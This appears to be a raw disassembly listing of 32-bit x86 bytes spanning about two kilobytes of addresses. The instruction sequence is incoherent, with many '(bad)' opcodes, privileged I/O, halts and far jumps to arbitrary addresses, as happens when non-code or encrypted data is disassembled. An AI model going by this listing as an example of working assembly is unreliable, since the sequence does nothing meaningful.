  4415f0:	xor    BYTE PTR [edx+edi*8],bh
  4415f3:	es loope 0x4415f9
  4415f6:	jp     0x4415d6
  4415f8:	lock loopne 0x4415e3
  4415fb:	sbb    BYTE PTR [eax+0x412a8023],0x16
  441602:	sar    BYTE PTR [esp+edx*8],cl
  441605:	mov    ah,BYTE PTR ds:0x4e3a7cd4
  44160b:	pop    edi
  44160c:	pop    eax
  44160d:	sbb    DWORD PTR [edx-0x6f],edx
  441610:	jge    0x441596
  441612:	add    al,0xb7
  441614:	shl    DWORD PTR [edx],0x6a
  441617:	xlat   BYTE PTR ds:[ebx]
  441618:	ror    DWORD PTR [edi+0x13],0xdd
  44161c:	test   BYTE PTR [esi-0x6331a0da],al
  441622:	jecxz  0x441676
  441624:	ret    0xf00e
  441627:	jge    0x441649
  441629:	test   bl,al
  44162b:	push   0x1801c126
  441630:	sub    BYTE PTR [esi],0x63
  441633:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441634:	jp     0x441696
  441636:	in     eax,dx
  441637:	dec    eax
  441638:	push   0x34
  44163a:	hlt    
  44163b:	out    dx,al
  44163c:	fistp  WORD PTR [eax]
  44163e:	xor    al,0xbe
  441640:	mov    cl,0x35
  441642:	fcom   DWORD PTR [eax+0x67b0ca3f]
  441648:	(bad)  
  441649:	in     eax,dx
  44164a:	mov    esp,0xe85b8b7c
  44164f:	pop    eax
  441650:	ror    DWORD PTR [eax-0x7b2547ac],1
  441656:	sbb    BYTE PTR [edi],cl
  441658:	pop    DWORD PTR [eax+0x56267c36]
  44165e:	(bad)  
  44165f:	in     al,dx
  441660:	aaa    
  441661:	fcmovb st,st(3)
  441663:	push   0xc01d858f
  441668:	mov    ?,WORD PTR [esi+ecx*4]
  44166b:	sub    esp,DWORD PTR [ebx]
  44166d:	(bad)  
  44166e:	and    ch,BYTE PTR [ecx+0x349b7dad]
  441674:	add    DWORD PTR [eax-0x4a],0x58
  441678:	xchg   ecx,eax
  441679:	add    eax,0x1f521e06
  44167e:	stos   BYTE PTR es:[edi],al
  44167f:	adc    BYTE PTR [ebp-0x34],cl
  441682:	add    eax,0xf022343e
  441687:	adc    BYTE PTR [eax-0x15],dl
  44168a:	call   0x3880:0xa86da930
  441691:	scas   eax,DWORD PTR es:[edi]
  441692:	repnz loope 0x441678
  441695:	push   ss
  441696:	dec    edi
  441697:	inc    edi
  441698:	shl    BYTE PTR [esi+0x1],0x92
  44169c:	or     dh,ch
  44169e:	mov    edx,0x70b0886a
  4416a3:	inc    ebp
  4416a4:	bound  esp,QWORD PTR [ebx-0x1b7b4d5]
  4416aa:	clc    
  4416ab:	dec    esp
  4416ac:	pop    esi
  4416ad:	sbb    bl,al
  4416af:	push   esp
  4416b0:	test   BYTE PTR [esi],0x88
  4416b3:	dec    ebp
  4416b4:	rcr    BYTE PTR [eax-0x1e4922ed],0x89
  4416bb:	add    BYTE PTR [esi+0x56e5206f],dl
  4416c1:	inc    esi
  4416c2:	add    ebx,ebx
  4416c4:	xchg   DWORD PTR [ebp+0x22edcea3],ebp
  4416ca:	jg     0x441662
  4416cc:	call   0x668507f7
  4416d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4416d2:	pop    esp
  4416d3:	pop    eax
  4416d4:	pop    esi
  4416d6:	das    
  4416d7:	adc    DWORD PTR [ebx+eiz*1-0x12],ebp
  4416db:	pop    esp
  4416dc:	(bad)  
  4416dd:	or     eax,0xa205596a
  4416e2:	mov    ebx,0x1f4f8e6
  4416e7:	add    ch,BYTE PTR [edi+0x21d8b881]
  4416ed:	jbe    0x441744
  4416ef:	push   ss
  4416f0:	int3   
  4416f1:	jbe    0x4416e9
  4416f3:	pop    esp
  4416f4:	mov    eax,0x33f840b1
  4416f9:	mov    ds:0x9802eda8,eax
  4416fe:	adc    al,0xac
  441700:	enter  0xb0c4,0x2f
  441704:	add    DWORD PTR [eax+0x20e295d6],ebp
  44170a:	jp     0x4416cc
  44170c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44170d:	push   ss
  44170e:	fsubr  st,st(7)
  441710:	jmp    0xb5bd2f3d
  441715:	cli    
  441716:	or     eax,0x12a12cf8
  44171b:	add    ch,BYTE PTR [ebx-0x2ba80bf4]
  441721:	pop    edx
  441722:	xor    ebp,DWORD PTR [edi+0x14]
  441725:	push   ecx
  441726:	add    BYTE PTR [ecx],al
  441728:	outs   dx,BYTE PTR ds:[esi]
  441729:	jo     0x4417a8
  44172b:	mov    al,ds:0x12292e73
  441730:	aad    0x1c
  441732:	fbstp  TBYTE PTR [edx+0x25002fa9]
  441738:	enter  0xb842,0x25
  44173c:	ss pop ebp
  44173e:	shr    eax,0xe8
  441741:	mov    edi,0x5f28245a
  441746:	or     al,0x5a
  441748:	inc    eax
  441749:	mov    edx,0x872e8234
  44174e:	popf   
  44174f:	test   DWORD PTR [esi-0x21c1cd24],esi
  441755:	push   ds
  441756:	test   eax,0xb4000476
  44175b:	lods   al,BYTE PTR ds:[esi]
  44175c:	cmp    al,BYTE PTR [esi]
  44175e:	mov    eax,ds:0x289a228f
  441763:	lods   eax,DWORD PTR ds:[esi]
  441764:	js     0x4417ce
  441766:	jne    0x4417a8
  441768:	(bad)
  44176b:	cmp    dl,BYTE PTR [ecx+0x50]
  44176e:	sub    al,al
  441770:	call   0xace5:0xaeea2978
  441777:	aam    0x68
  441779:	mov    ds:0xc03c1e5a,eax
  44177e:	sub    DWORD PTR [eax+ecx*2+0x7a],esi
  441782:	add    al,0xb0
  441784:	jnp    0x44171c
  441786:	jno    0x441772
  441788:	xor    BYTE PTR [ecx+0x21],dh
  44178b:	push   0x93ca8e4c
  441790:	mov    al,0x5d
  441792:	inc    eax
  441793:	loopne 0x441763
  441795:	adc    BYTE PTR [ebx+0xf5dabf],al
  44179b:	push   0xffffffd7
  44179d:	dec    ebp
  44179e:	mov    dh,0xfb
  4417a0:	je     0x4417bc
  4417a2:	push   eax
  4417a3:	call   0x3bf0:0x4ad8413e
  4417aa:	nop
  4417ab:	xchg   ecx,eax
  4417ac:	xchg   edi,eax
  4417ad:	adc    BYTE PTR [edi+esi*4+0x3c655a21],al
  4417b4:	dec    ebx
  4417b5:	and    eax,0xb7453850
  4417ba:	and    eax,0xe836fb41
  4417bf:	push   eax
  4417c0:	and    cl,BYTE PTR [eax+0x6805b744]
  4417c6:	inc    eax
  4417c7:	xor    BYTE PTR [edx-0x16],bl
  4417ca:	icebp  
  4417cb:	mov    esi,0xc2d9b585
  4417d0:	jbe    0x4417a2
  4417d2:	push   cs
  4417d3:	add    al,0x2c
  4417d5:	mov    ah,0xd3
  4417d7:	push   ss
  4417d8:	aam    0x5c
  4417da:	pop    eax
  4417db:	fstp   QWORD PTR [edx+0x15]
  4417de:	push   esp
  4417df:	shr    ah,1
  4417e1:	idiv   BYTE PTR ss:[eax-0x3da1412a]
  4417e8:	js     0x44176f
  4417ea:	pop    ss
  4417eb:	xor    bl,BYTE PTR [eax]
  4417ed:	and    BYTE PTR [ecx-0x47611cb4],dl
  4417f3:	adc    al,dh
  4417f5:	or     edi,DWORD PTR [eax-0x2f2154c2]
  4417fb:	jo     0x441865
  4417fd:	(bad)  
  4417fe:	jmp    0x44187e
  441800:	scas   al,BYTE PTR es:[edi]
  441801:	inc    eax
  441802:	shr    BYTE PTR [ecx-0x3e],1
  441805:	and    eax,DWORD PTR [esi]
  441807:	adc    BYTE PTR [edi+0x5a],0x7e
  44180b:	cld    
  44180c:	sub    bh,ah
  44180e:	pushf  
  44180f:	adc    ecx,0xffffff9a
  441812:	adc    al,0x3a
  441814:	cmp    BYTE PTR [eax-0x78],0x58
  441818:	popa   
  441819:	loop   0x4417eb
  44181b:	mov    al,BYTE PTR [ecx]
  44181d:	xor    edx,eax
  44181f:	int3   
  441820:	shr    DWORD PTR [eax],0x2c
  441823:	shl    BYTE PTR [ecx],cl
  441825:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441826:	(bad)  
  441827:	push   ss
  441828:	xchg   BYTE PTR [edi*4+0x5167c25e],bh
  44182f:	fistp  DWORD PTR [edx-0x11c72dde]
  441835:	inc    esp
  441836:	jge    0x441822
  441838:	add    ecx,DWORD PTR [edi+edx*4+0x6ecb47f6]
  44183f:	inc    eax
  441840:	mov    ebx,0x29fb4098
  441845:	lock mov bl,0xad
  441848:	push   0xfffffff2
  44184a:	add    eax,0xcaed1114
  44184f:	mov    eax,ds:0x3338e140
  441854:	outs   dx,DWORD PTR ds:[esi]
  441855:	inc    ecx
  441856:	in     eax,dx
  441857:	add    ebx,eax
  441859:	lahf   
  44185a:	xchg   BYTE PTR [edx],bh
  44185c:	push   esp
  44185d:	pop    eax
  44185e:	arpl   dx,sp
  441860:	push   ebx
  441861:	rcl    BYTE PTR [edx*4+0x7f68a0],cl
  441868:	mov    ds:0xaee15481,eax
  44186d:	in     eax,dx
  44186e:	pop    edx
  44186f:	test   DWORD PTR [ecx-0x8],ebp
  441872:	push   0x24500f70
  441877:	lods   al,BYTE PTR ds:[esi]
  441878:	test   BYTE PTR [esi+0xd],dh
  44187b:	mov    DWORD PTR [edx],ebp
  44187d:	call   0xf64e1cb4
  441882:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441883:	mov    al,ds:0x8aed086a
  441888:	jge    0x4418b2
  44188a:	inc    ebx
  44188b:	sbb    BYTE PTR [ebx-0x6f],ch
  44188e:	adc    esi,eax
  441890:	and    DWORD PTR [eax-0x2daff9f0],edx
  441896:	jp     0x441905
  441898:	pusha  
  441899:	mov    ?,ebp
  44189b:	mov    eax,0xa6b8f88d
  4418a0:	mov    cl,0x3d
  4418a2:	pop    edx
  4418a3:	mov    edi,0xe072330a
  4418a8:	ret    
  4418a9:	and    eax,0x4ee88b14
  4418ae:	xchg   edx,ebp
  4418b0:	imul   esi,DWORD PTR [eax],0x5a
  4418b3:	mov    bl,0x74
  4418b5:	retf   0x4a06
  4418b8:	inc    ecx
  4418b9:	call   0x558c686a
  4418be:	cmp    dl,BYTE PTR [esp+eax*2]
  4418c1:	rol    BYTE PTR [edx-0x56],0xa6
  4418c5:	icebp  
  4418c6:	sbb    esi,eax
  4418c8:	lahf   
  4418c9:	loope  0x4418b7
  4418cb:	mov    edi,0x600f04f2
  4418d0:	mov    esp,0x36c4adb0
  4418d5:	dec    esi
  4418d6:	(bad)  
  4418d7:	push   esp
  4418d8:	fld    DWORD PTR [eax]
  4418da:	jbe    0x44185e
  4418dc:	lahf   
  4418dd:	adc    al,0x4e
  4418df:	sbb    al,0xac
  4418e1:	dec    ebp
  4418e2:	lock int3 
  4418e4:	or     BYTE PTR [ebp-0x6c8e9a0],cl
  4418ea:	(bad)  
  4418ec:	rcl    ch,1
  4418ee:	or     eax,0x3fe60eec
  4418f3:	push   esi
  4418f4:	mov    ebx,0x58874b62
  4418f9:	adc    BYTE PTR [esi+0x70ac563e],ah
  4418ff:	(bad)  
  441900:	daa    
  441901:	or     DWORD PTR [ebp-0x48],0x5d8cd9a0
  441908:	xchg   esp,eax
  441909:	fiadd  DWORD PTR [eax-0x67fb857f]
  44190f:	push   0x5c70e0a6
  441914:	sbb    DWORD PTR [eax+esi*4],esp
  441917:	test   al,0x3d
  441919:	inc    edx
  44191a:	and    al,0xb8
  44191c:	dec    ebp
  44191d:	sbb    dh,BYTE PTR [eax-0x5b]
  441920:	adc    bl,BYTE PTR [edi]
  441922:	and    al,0xbc
  441924:	ss pusha 
  441926:	adc    eax,ebx
  441928:	mov    BYTE PTR [esi],ah
  44192a:	or     al,0x35
  44192c:	fadd   DWORD PTR [edi+0xe]
  44192f:	mov    al,0x60
  441931:	mov    BYTE PTR [esi+ebp*8+0x3a949f89],ah
  441938:	stos   BYTE PTR es:[edi],al
  441939:	iret   
  44193a:	jb     0x4419ba
  44193c:	scas   eax,DWORD PTR es:[edi]
  44193d:	cmp    ebx,DWORD PTR [esi+0x64]
  441940:	lods   al,BYTE PTR ds:[esi]
  441941:	push   0x7c
  441943:	xor    BYTE PTR [eax+0x0],0xf
  441947:	js     0x441947
  441949:	test   al,0xc2
  44194b:	jbe    0x441991
  44194d:	add    DWORD PTR [esi],ebx
  44194f:	fcomp  QWORD PTR [esi+0x6e]
  441952:	pop    ds
  441953:	jbe    0x4419a9
  441955:	jl     0x4419a8
  441957:	inc    esp
  441958:	bound  edx,QWORD PTR [eax]
  44195a:	shl    ah,1
  44195c:	pop    ds
  44195d:	dec    ebp
  44195e:	mov    dh,0xf0
  441960:	add    BYTE PTR [edx],al
  441962:	js     0x4419cb
  441964:	scas   eax,DWORD PTR es:[edi]
  441965:	stos   BYTE PTR es:[edi],al
  441966:	shr    BYTE PTR [eax+0xd63efa],0x18
  44196d:	loopne 0x441940
  44196f:	pop    ebp
  441970:	add    edi,DWORD PTR [edx+0x0]
  441973:	push   ds
  441974:	sub    ebx,DWORD PTR [ebp-0x2cf55b04]
  44197a:	push   ss
  44197b:	adc    eax,0x1e44a880
  441980:	jg     0x4419b0
  441982:	test   BYTE PTR [eax-0x39bd0f62],ah
  441988:	loop   0x44193c
  44198a:	js     0x4419db
  44198c:	stc    
  44198d:	and    ch,ah
  44198f:	xchg   BYTE PTR [edi+0x19],cl
  441992:	cmp    eax,eax
  441994:	cs repz pop edx
  441997:	xor    DWORD PTR [esi-0x29b00960],eax
  44199d:	test   DWORD PTR [ecx+0x26],esp
  4419a0:	or     al,0x65
  4419a2:	add    BYTE PTR [ecx],bh
  4419a4:	out    0xbe,eax
  4419a6:	imul   edi,eax,0x82b7e10d
  4419ac:	cmp    al,0x9c
  4419ae:	cwde   
  4419af:	xor    BYTE PTR [esi+0x487daba2],ch
  4419b5:	pop    eax
  4419b6:	daa    
  4419b7:	loop   0x441983
  4419b9:	bound  eax,QWORD PTR [ecx-0x16]
  4419bc:	adc    esp,edx
  4419be:	add    BYTE PTR [edx-0x4c57f329],bh
  4419c4:	test   BYTE PTR [esi],dh
  4419c6:	sti    
  4419c7:	add    DWORD PTR [edx-0x12],ebx
  4419ca:	xor    eax,0x33e01046
  4419cf:	inc    ecx
  4419d0:	pop    ebp
  4419d1:	push   0x17
  4419d3:	pop    esi
  4419d4:	(bad)  
  4419d5:	call   0xf6448856
  4419da:	mov    dl,dl
  4419dc:	inc    edi
  4419dd:	push   edx
  4419de:	xchg   BYTE PTR [edx],cl
  4419e0:	mov    BYTE PTR [esi+0x6d00163b],cl
  4419e6:	inc    edi
  4419e7:	mov    bl,0x60
  4419e9:	inc    esi
  4419ea:	or     dh,ah
  4419ec:	int3   
  4419ed:	sub    esi,DWORD PTR [edi]
  4419ef:	pop    esi
  4419f0:	test   eax,0xb828282c
  4419f5:	call   0x245d1a0d
  4419fa:	fdivrp st(6),st
  4419fc:	pusha  
  4419fd:	nop
  4419fe:	jmp    0xb20d:0xaf130f32
  441a05:	out    0x83,al
  441a07:	or     ah,BYTE PTR [edx-0x1d297515]
  441a0d:	dec    edx
  441a0e:	cld    
  441a0f:	inc    edx
  441a10:	or     BYTE PTR [ebx+0x45],bl
  441a13:	and    al,BYTE PTR [edx-0x50]
  441a16:	sbb    al,0xe3
  441a18:	js     0x441a4a
  441a1a:	mov    esp,ss
  441a1c:	dec    eax
  441a1d:	mov    ebx,0xeaa0a5ec
  441a22:	in     al,0xc8
  441a24:	jne    0x441a08
  441a26:	mov    al,0xd4
  441a28:	xor    BYTE PTR [eax+0x76503c0c],ch
  441a2e:	rol    BYTE PTR [ebp+eax*1-0x4b89df71],1
  441a35:	lods   al,BYTE PTR ds:[esi]
  441a36:	loope  0x441a08
  441a38:	aas    
  441a39:	jb     0x4419ca
  441a3b:	pop    ebx
  441a3c:	inc    ebp
  441a3d:	inc    ecx
  441a3e:	imul   esp,DWORD PTR [edx],0x6c
  441a41:	jl     0x441a56
  441a43:	fidiv  WORD PTR ds:0xa458efd6
  441a49:	imul   ebp,DWORD PTR [edx-0x26],0xa0a2482f
  441a50:	dec    esi
  441a51:	inc    esi
  441a52:	(bad)  
  441a53:	adc    BYTE PTR [eax-0x5f662fb6],dh
  441a59:	and    bh,ah
  441a5b:	jae    0x441a52
  441a5d:	addr16 inc eax
  441a5f:	(bad)
  441a63:	xchg   esp,eax
  441a64:	(bad)  
  441a65:	fadd   DWORD PTR [eax]
  441a67:	pop    eax
  441a68:	pop    es
  441a69:	adc    ebx,DWORD PTR [eax+0x50]
  441a6c:	dec    esi
  441a6d:	data16 js 0x441ad1
  441a70:	mov    cl,0x22
  441a72:	movups xmm2,xmm0
  441a75:	fimul  DWORD PTR [ecx-0x53]
  441a78:	cli    
  441a79:	sti    
  441a7a:	mov    dl,0x45
  441a7c:	dec    edx
  441a7d:	test   BYTE PTR [edi+0x1b8e0d85],ch
  441a83:	add    BYTE PTR [edx-0x6fa9ad4b],ch
  441a89:	cmp    DWORD PTR [edx+0x7a18678a],ebp
  441a8f:	hlt    
  441a90:	cs jbe 0x441b11
  441a93:	xchg   ebp,eax
  441a94:	rol    cl,1
  441a96:	sar    al,0x11
  441a99:	enter  0x6e52,0x5e
  441a9d:	arpl   WORD PTR [ebp+0x6b],dx
  441aa0:	mov    esi,0x665a6ae0
  441aa5:	in     al,0x59
  441aa7:	xchg   BYTE PTR [ecx-0x68764cc6],cl
  441aad:	xor    al,ah
  441aaf:	mov    esp,0x76a56093
  441ab4:	or     edx,ebp
  441ab6:	repz (bad) 
  441ab8:	loopne 0x441abe
  441aba:	mov    esi,0x41798007
  441abf:	xchg   DWORD PTR [edi+ebp*1],esi
  441ac2:	jle    0x441afa
  441ac4:	add    BYTE PTR ds:0x4b2bd21d,cl
  441aca:	fnsave [esi+0x1d8fa622]
  441ad0:	cmp    BYTE PTR [eax+esi*8-0x3a303a8],dh
  441ad7:	ss std 
  441ad9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441ada:	pusha  
  441adb:	push   esp
  441adc:	imul   esi,DWORD PTR [esi+0x5493faa2],0x14
  441ae3:	sbb    BYTE PTR [edx-0x5ae9415a],0xf8
  441aea:	cmp    al,0x90
  441aec:	aad    0x4c
  441aee:	mov    ah,0x28
  441af0:	fcom   QWORD PTR [ecx+0x65002a61]
  441af6:	shl    BYTE PTR [edx+0x5684d6aa],cl
  441afc:	and    al,0x26
  441afe:	mov    al,0x14
  441b00:	fstp   DWORD PTR [edx+ecx*8]
  441b03:	pop    ds
  441b04:	xchg   BYTE PTR [esi+0x9],dl
  441b07:	mov    ?,WORD PTR [eax]
  441b09:	xchg   ebp,ebp
  441b0b:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441b0d:	jbe    0x441b18
  441b0f:	test   al,0xb5
  441b11:	dec    esp
  441b12:	mov    dl,0xe8
  441b14:	(bad)  
  441b15:	add    ah,BYTE PTR [esi+eax*2+0x34]
  441b19:	push   0x36
  441b1b:	pop    eax
  441b1c:	xlat   BYTE PTR ds:[ebx]
  441b1d:	rol    BYTE PTR [eax+0x32be3f56],0x66
  441b24:	mov    bh,0xb5
  441b26:	xchg   DWORD PTR [ecx-0x2f9d7f13],eax
  441b2c:	fs (bad) 
  441b2e:	push   ebx
  441b2f:	fdiv   st,st(4)
  441b31:	and    BYTE PTR [esi],bl
  441b33:	call   0xfeb02c22
  441b38:	cmc    
  441b39:	xchg   ecx,eax
  441b3a:	cmp    edi,DWORD PTR ds:0xe409f50
  441b40:	jecxz  0x441af7
  441b42:	lods   al,BYTE PTR ds:[esi]
  441b43:	out    0xe0,al
  441b45:	fs mov esi,0x565816ab
  441b4b:	jmp    0x63c31bda
  441b50:	loop   0x441b91
  441b52:	mov    DWORD PTR [ebp-0x27216960],ebp
  441b58:	js     0x441b8e
  441b5a:	pop    edx
  441b5b:	aaa    
  441b5c:	pop    esi
  441b5d:	out    0x1f,al
  441b5f:	stos   BYTE PTR es:[edi],al
  441b60:	mov    cs,WORD PTR [ebx+0x11]
  441b63:	je     0x441b3e
  441b65:	mov    ch,BYTE PTR [ebp+0x54]
  441b68:	mov    ebx,0x8bd2fdac
  441b6d:	sti    
  441b6e:	dec    BYTE PTR [edi]
  441b70:	or     esi,DWORD PTR [ecx+edx*2]
  441b73:	(bad)  
  441b74:	sahf   
  441b75:	or     al,0x6c
  441b77:	or     DWORD PTR [ecx+0x30e24243],ebp
  441b7d:	push   es
  441b7e:	add    DWORD PTR [eax-0x50],ecx
  441b81:	stos   BYTE PTR es:[edi],al
  441b82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441b83:	add    al,0x6
  441b85:	xchg   ebp,eax
  441b86:	leave  
  441b87:	inc    edx
  441b88:	pop    edx
  441b89:	cmp    al,0x82
  441b8b:	aam    0x1a
  441b8d:	jae    0x441b95
  441b8f:	pushf  
  441b90:	repz pop ss
  441b92:	push   ds
  441b93:	adc    al,0x3c
  441b95:	pop    ecx
  441b96:	fsubr  DWORD PTR [esi]
  441b98:	cwde   
  441b99:	inc    esi
  441b9a:	jle    0x441c01
  441b9c:	push   es
  441b9d:	mov    BYTE PTR ss:[edi-0x4f01c980],dl
  441ba4:	dec    esi
  441ba5:	mov    eax,0x431ce939
  441baa:	or     edi,DWORD PTR [esi-0x31f943aa]
  441bb0:	call   0x64d5:0x807dda52
  441bb7:	push   esp
  441bb8:	or     BYTE PTR [edx],cl
  441bba:	adc    DWORD PTR ds:0x7a0bcd4a,0x39
  441bc1:	test   dh,bl
  441bc3:	retf   
  441bc4:	icebp  
  441bc5:	add    BYTE PTR [edx+0x1eb0e0],bl
  441bcb:	push   ebp
  441bcc:	cwde   
  441bcd:	scas   eax,DWORD PTR es:[edi]
  441bce:	out    dx,al
  441bcf:	pushf  
  441bd0:	push   edx
  441bd1:	loopne 0x441ba3
  441bd3:	push   0x0
  441bd5:	scas   eax,DWORD PTR es:[edi]
  441bd6:	xor    bh,dl
  441bd8:	outs   dx,BYTE PTR ds:[esi]
  441bd9:	inc    ebx
  441bda:	stos   DWORD PTR es:[edi],eax
  441bdb:	adc    ebp,edx
  441bdd:	je     0x441c2a
  441bdf:	push   esi
  441be0:	and    DWORD PTR [edx],eax
  441be2:	add    ah,dh
  441be4:	adc    eax,eax
  441be6:	stc    
  441be7:	test   dl,ah
  441be9:	fdiv   QWORD PTR [edi]
  441beb:	and    DWORD PTR [eax+0x785ab8d8],0x54428732
  441bf5:	mov    bh,BYTE PTR [esi]
  441bf7:	inc    ecx
  441bf8:	pusha  
  441bf9:	adc    al,0xb8
  441bfb:	jb     0x441c10
  441bfd:	ret    0xa8ae
  441c00:	add    edx,DWORD PTR [eax+0x3b]
  441c03:	jle    0x441c5f
  441c05:	in     eax,dx
  441c06:	scas   al,BYTE PTR es:[edi]
  441c07:	ins    DWORD PTR es:[edi],dx
  441c08:	test   al,0x8d
  441c0a:	add    dh,BYTE PTR [edi]
  441c0c:	dec    eax
  441c0d:	xor    BYTE PTR [edx],dl
  441c0f:	scas   al,BYTE PTR es:[edi]
  441c10:	jae    0x441c6c
  441c12:	lods   eax,DWORD PTR ds:[esi]
  441c13:	xor    eax,0x4c4cba50
  441c18:	mov    eax,0x76348051
  441c1d:	clc    
  441c1e:	push   0xc49f7769
  441c23:	sbb    ebx,esp
  441c25:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441c27:	jmp    FWORD PTR [ebx+0x1d]
  441c2a:	fbld   TBYTE PTR [esi+0x3c84ba00]
  441c30:	jl     0x441be0
  441c32:	push   ss
  441c33:	inc    edx
  441c34:	push   0xce2869ad
  441c39:	push   ss
  441c3a:	cs xchg esp,eax
  441c3c:	pop    ecx
  441c3d:	push   ss
  441c3e:	rcl    DWORD PTR [edx+0x10],cl
  441c41:	test   eax,0xd6b25ce9
  441c46:	adc    DWORD PTR [edx+0x140195e2],0xffffffd0
  441c4d:	jb     0x441cb3
  441c4f:	mov    ebp,0xf8013e89
  441c54:	add    al,0x4a
  441c56:	add    al,0x9d
  441c58:	or     dl,ch
  441c5a:	xchg   ecx,eax
  441c5b:	dec    ebp
  441c5c:	shl    DWORD PTR [ecx-0x21e1ed7c],cl
  441c62:	outs   dx,BYTE PTR ds:[esi]
  441c63:	cmp    BYTE PTR [esp+ecx*2],0xd3
  441c67:	xor    al,0xd7
  441c69:	out    0x6,al
  441c6b:	inc    edx
  441c6c:	aam    0x65
  441c6e:	enter  0xee28,0xac
  441c72:	sub    edi,DWORD PTR [esi]
  441c74:	ret    0xde68
  441c77:	jl     0x441c4d
  441c79:	add    BYTE PTR [esi+0x56],ah
  441c7c:	mov    ecx,0x83387400
  441c81:	push   0xf
  441c83:	xor    bl,BYTE PTR [esp+ebp*8]
  441c86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441c87:	ret    0x8eff
  441c8a:	dec    ebx
  441c8b:	stos   BYTE PTR es:[edi],al
  441c8c:	push   cs
  441c8d:	popf   
  441c8e:	dec    esp
  441c8f:	lods   eax,DWORD PTR ds:[esi]
  441c90:	ror    dh,cl
  441c92:	mov    bl,0x0
  441c94:	push   eax
  441c95:	add    BYTE PTR [eax],0xfa
  441c98:	pop    edx
  441c99:	add    dl,BYTE PTR [edx]
  441c9b:	adc    BYTE PTR [eax],dh
  441c9d:	(bad)  
  441c9e:	mul    BYTE PTR [esp+ebp*8]
  441ca1:	jo     0x441c45
  441ca3:	scas   al,BYTE PTR es:[edi]
  441ca4:	add    cl,BYTE PTR [edi+0x61cda2c]
  441caa:	lock add esi,edx
  441cad:	inc    ebx
  441cae:	push   ecx
  441caf:	loop   0x441cb6
  441cb1:	test   DWORD PTR [esi-0x44b8bf8],ebx
  441cb7:	mov    edx,0x1bc80f18
  441cbc:	mov    ch,0xeb
  441cbe:	jmp    0x47ae:0x7ac00696
  441cc5:	mov    ah,0xc8
  441cc7:	add    DWORD PTR [eax+edi*8+0x34667a32],ebp
  441cce:	mov    al,0x3c
  441cd0:	test   DWORD PTR [esi-0x7303de1f],esp
  441cd6:	push   edx
  441cd7:	out    0xaa,al
  441cd9:	lds    esp,FWORD PTR [ebp+0x60]
  441cdc:	shl    DWORD PTR ds:0x88ea3b02,0x37
  441ce3:	rol    BYTE PTR [esi],0xdb
  441ce6:	cs aam 0xc
  441ce9:	pop    eax
  441cea:	jl     0x441d10
  441cec:	retf   0x94c2
  441cef:	adc    eax,0x87a037f8
  441cf4:	or     al,0x3c
  441cf6:	sbb    DWORD PTR [edx],ebx
  441cf8:	fld    QWORD PTR fs:[eax]
  441cfb:	jge    0x441cc3
  441cfd:	imul   ebp,DWORD PTR [ebx-0x7c6fd40],0xffffffa1
  441d04:	sub    esi,DWORD PTR [eax]
  441d06:	add    BYTE PTR ds:0x67c3c17,0x97
  441d0d:	or     BYTE PTR [edx+0x1d],0x28
  441d11:	mov    esp,0xf3d3c750
  441d16:	inc    edi
  441d17:	mov    al,0x9
  441d19:	add    BYTE PTR [ebp-0x50],bl
  441d1c:	mov    bh,0x6e
  441d1e:	cmp    BYTE PTR [edi-0x7053e141],0x96
  441d25:	cmp    BYTE PTR [esi-0x70],cl
  441d28:	nop
  441d29:	pop    edx
  441d2a:	dec    ebx
  441d2b:	jmp    0x8ba4:0x164242a
  441d32:	ins    BYTE PTR es:[edi],dx
  441d33:	sub    eax,0x56e63d38
  441d38:	loop   0x441d8e
  441d3a:	popa   
  441d3b:	jae    0x441db5
  441d3d:	or     al,0x2
  441d3f:	mov    edi,0x85717a6
  441d44:	push   edx
  441d45:	pop    ebx
  441d46:	cmp    BYTE PTR [ecx+0x6a125858],cl
  441d4c:	test   eax,0x4211702a
  441d51:	push   ds
  441d52:	repz adc cl,BYTE PTR [ebx]
  441d55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441d56:	ror    BYTE PTR [ecx-0x60],1
  441d59:	and    BYTE PTR [ecx+eiz*1+0xd34d356],bh
  441d60:	fistp  DWORD PTR [esi+0x16]
  441d63:	int3   
  441d64:	loope  0x441d64
  441d66:	sbb    ebx,DWORD PTR [ebp+0x5f858cef]
  441d6c:	inc    esi
  441d6d:	jns    0x441d39
  441d6f:	std    
  441d70:	inc    ebp
  441d71:	sub    BYTE PTR [ecx-0x26],al
  441d74:	mov    eax,ds:0x24e8ce70
  441d79:	mov    ebp,0xd3ad415e
  441d7e:	shl    BYTE PTR [esi-0xf895c52],1
  441d84:	inc    eax
  441d85:	pop    ds
  441d86:	sub    DWORD PTR [ebp+0x66],esi
  441d89:	cmp    eax,DWORD PTR [edi+eiz*2+0x37]
  441d8d:	lods   al,BYTE PTR ds:[esi]
  441d8e:	push   edi
  441d8f:	(bad)  
  441d90:	dec    edi
  441d91:	sbb    BYTE PTR [edx+0x4c],dl
  441d94:	add    bl,BYTE PTR [esi+0x12]
  441d97:	imul   esp,DWORD PTR [edx-0x3f],0xffffff87
  441d9b:	xchg   esp,eax
  441d9c:	push   0xc
  441d9e:	in     al,0x90
  441da0:	push   0xffffff96
  441da2:	mov    al,0x55
  441da4:	inc    eax
  441da5:	push   eax
  441da6:	xchg   esi,eax
  441da7:	pop    esi
  441da8:	in     al,dx
  441da9:	fst    QWORD PTR [edx+0x3]
  441dac:	dec    ebp
  441dad:	sti    
  441dae:	sub    BYTE PTR [eax+0x1ec125fa],al
  441db4:	scas   eax,DWORD PTR es:[edi]
  441db5:	inc    ebp
  441db6:	push   ebp
  441db7:	fiadd  DWORD PTR [eax-0x2e]
  441dba:	in     al,0x7c
  441dbc:	out    dx,al
  441dbd:	imul   ebp,DWORD PTR [eax+0x3b],0x4018344c
  441dc4:	mov    dh,BYTE PTR [esi-0x7d7a9df5]
  441dca:	enter  0x8554,0x76
  441dce:	cmp    eax,esp
  441dd0:	js     0x441e37
  441dd2:	add    cl,BYTE PTR [ebp-0x4fc7727e]
  441dd8:	and    DWORD PTR [eax],ecx
